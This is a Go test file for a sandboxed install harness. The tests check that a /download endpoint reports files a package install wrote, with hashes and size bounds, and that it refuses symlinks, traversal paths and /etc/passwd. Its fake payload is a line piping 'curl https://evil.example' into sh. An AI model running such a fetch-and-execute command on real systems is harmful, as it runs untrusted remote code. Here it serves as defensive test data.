package harness

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// payload is what the fake install writes outside the working directory.
const payload = "#!/bin/sh\ncurl https://evil.example | sh\n"

// wroteFile installs with a fake that writes ~/.cache/x, a file the
// harness observes the server writing.
func wroteFile(t *testing.T) (testRun, string) {
	t.Helper()
	return wrote(t, payload)
}

// wrote installs with a fake that writes content to ~/.cache/x.
func wrote(t *testing.T, content string) (testRun, string) {
	t.Helper()
	inst := &fakeInstaller{}
	run := newTestRun(t, inst)
	must(t, os.WriteFile(filepath.Join(run.home, ".profile"), []byte("before"), 0o600))
	written := filepath.Join(run.home, ".cache", "x")
	inst.write = func(Sandbox) {
		must(t, os.MkdirAll(filepath.Dir(written), 0o750))
		must(t, os.WriteFile(written, []byte(content), 0o600))
	}
	if status, body := run.do(t, http.MethodPost, "/install", installBody("npm", "weather@1.0.0")); status != http.StatusOK {
		t.Fatalf("POST /install = %d %v", status, body)
	}
	return run, written
}

func TestDownloadDescribesAFileTheServerWrote(t *testing.T) {
	run, written := wroteFile(t)
	status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written})
	sum := sha256.Sum256([]byte(payload))
	if status != http.StatusOK ||
		text(t, body["path"]) != written ||
		!jsonEqual(t, body["size"], mustJSON(t, len(payload))) ||
		text(t, body["sha256"]) != hex.EncodeToString(sum[:]) ||
		text(t, body["kind"]) != "text/plain; charset=utf-8" ||
		text(t, body["excerpt"]) != payload {
		t.Errorf("POST /download = %d %v", status, body)
	}
}

func TestDownloadOnlyDescribesAFileSeenWritten(t *testing.T) {
	run, written := wroteFile(t)
	for path, want := range map[string]int{
		filepath.Join(run.home, ".profile"): http.StatusNotFound,
		"/etc/passwd":                       http.StatusNotFound,
		".cache/x":                          http.StatusBadRequest,
		written + "/../x":                   http.StatusBadRequest,
	} {
		if status, _ := run.do(t, http.MethodPost, "/download", map[string]any{"path": path}); status != want {
			t.Errorf("POST /download %s = %d, want %d", path, status, want)
		}
	}
}

func TestDownloadRefusesAWrittenFileSwappedForALink(t *testing.T) {
	run, written := wroteFile(t)
	must(t, os.Remove(written))
	// A relative link to a file inside the home: os.Root alone follows it.
	must(t, os.Symlink("../.profile", written))
	if status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written}); status != http.StatusBadRequest {
		t.Errorf("POST /download of a link = %d %v, want 400", status, body)
	}
	must(t, os.Remove(written))
	if status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written}); status != http.StatusNotFound {
		t.Errorf("POST /download of a removed file = %d %v, want 404", status, body)
	}
}

func TestDownloadsExcerptIsBoundedAndItsHashCoversTheWholeFile(t *testing.T) {
	content := strings.Repeat("a", maxDownloadExcerpt) + strings.Repeat("b", 6000)
	run, written := wrote(t, content)
	status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written})
	sum := sha256.Sum256([]byte(content))
	if status != http.StatusOK || len(text(t, body["excerpt"])) != 4096 ||
		!jsonEqual(t, body["size"], mustJSON(t, len(content))) ||
		text(t, body["sha256"]) != hex.EncodeToString(sum[:]) {
		t.Errorf("POST /download = %d, excerpt %d bytes, size %s, sha256 %s; want a 4096-byte excerpt of the whole file", status, len(text(t, body["excerpt"])), body["size"], body["sha256"])
	}
}

func TestDownloadOfAFileOverTheBoundIsTooLarge(t *testing.T) {
	run, written := wroteFile(t)
	// Sparse: no disk is used.
	must(t, os.Truncate(written, maxDownload+1))
	if status, body := run.do(t, http.MethodPost, "/download", map[string]any{"path": written}); status != http.StatusRequestEntityTooLarge {
		t.Errorf("POST /download of %d bytes = %d %v, want 413", maxDownload+1, status, body)
	}
}

func TestAFileThatGrowsPastTheBoundWhileReadIsTooLargeNotPartlyHashed(t *testing.T) {
	for name, tc := range map[string]struct {
		content string
		err     error
	}{
		"at the bound":   {"12345", nil},
		"past the bound": {"123456", errTooLarge},
	} {
		size, sum, err := hashBounded(strings.NewReader(tc.content), 5)
		if !errors.Is(err, tc.err) || (err == nil && (size != 5 || sum == "")) {
			t.Errorf("%s: hashBounded = %d %q %v, want error %v", name, size, sum, err, tc.err)
		}
	}
}
